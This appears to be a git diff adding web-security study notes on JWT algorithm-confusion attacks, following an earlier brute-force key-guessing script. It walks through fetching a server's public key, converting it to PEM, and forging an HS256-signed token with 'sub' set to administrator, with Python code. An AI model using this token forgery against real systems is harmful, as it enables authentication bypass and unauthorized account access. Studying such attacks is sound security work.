@@ -216,3 +216,77 @@ brute_force_attack(jwt_token, 3)
 #+end_src
 
 This code tries all lowercase letter combinations of lengths 1 to 3 to guess the JWT's signature key. If it finds the correct key, it successfully decodes the JWT and prints out the correct key.
+
+* Algorithm confusion
+One of the common attacks that jeopardize the security of JWTs (JSON Web Tokens) is the algorithm confusion attack. This attack involves misconfiguring or exploiting the signing algorithm of a JWT.
+
+Algorithm confusion attacks occur when an attacker tricks the server into verifying a JWT’s signature using a different algorithm than the website developers intended.
+
+*symmetric algorithms* ->
+ HS256: Use the same key for both signing and verification. This key must be kept secret like a password.
+
+*asymmetric algorithms* ->
+RS256: Use different keys for signing and verification. A private key signs the token, and a public key verifies it. The public key can be shared, while the private key must be kept secret.
+
+Algorithm confusion vulnerabilities arise from incorrect implementations of JWT libraries. Many libraries choose the algorithm based on the alg parameter in the JWT header.
+
+For example, in the simplified code snippet below, the signature verification is done for both RS256 and HS256 algorithms:
+#+begin_src python
+def verify(token, secretOrPublicKey):
+    algorithm = token.getAlgHeader()
+    if algorithm == "RS256":
+        # Use the provided key as an RSA public key
+    elif algorithm == "HS256":
+        # Use the provided key as an HMAC secret key
+#+end_src
+
+If developers assume that the server will only accept tokens signed with RS256 and use a fixed public key, attackers could sign the token with HS256 and verify it using the fixed public key as the HMAC secret key.
+
+** obtain the server public key
+ This key is often available at a standard endpoint like /jwks.json or /.well-known/jwks.json.
+
+ Servers sometimes store their public keys as JSON Web Key (JWK) objects at a standard endpoint. For example:
+ #+begin_src python
+{
+  "keys": [
+    {
+      "kty": "RSA",
+      "e": "AQAB",
+      "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
+      "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
+    }
+  ]
+}
+ #+end_src
+** convert the public key to a proper format
+Convert the obtained JWK (JSON Web Key) to the required format (e.g., PEM).
+
+Use the JWT Editor extension for Burp Suite to convert the public key from JWK format to X.509 PEM format:
+- Go to the JWT Editor Keys tab in Burp Suite.
+- Create a new RSA Key and paste the JWK.
+- Convert it to PEM format and use this key to create the signature.
+
+** create a malicious JWT
+Modify the payload and set the alg header to HS256.
+
+Modify the alg parameter in the JWT header to HS256 and manipulate the payload.
+
+** sign the token with HS256
+Use the public key as the secret to sign the token.
+
+Sign the token using the HS256 algorithm, using the public key as the secret key:
+#+begin_src python
+import jwt
+
+header = {
+    "alg": "HS256",
+    "typ": "JWT"
+}
+payload = {
+    "sub": "administrator"
+}
+token = jwt.encode(payload, "PUBLIC_KEY_AS_SECRET", algorithm="HS256", headers=header)
+print(token)
+#+end_src
+
+By following these steps, we can circumvent the JWT verification process and gain unauthorized access.
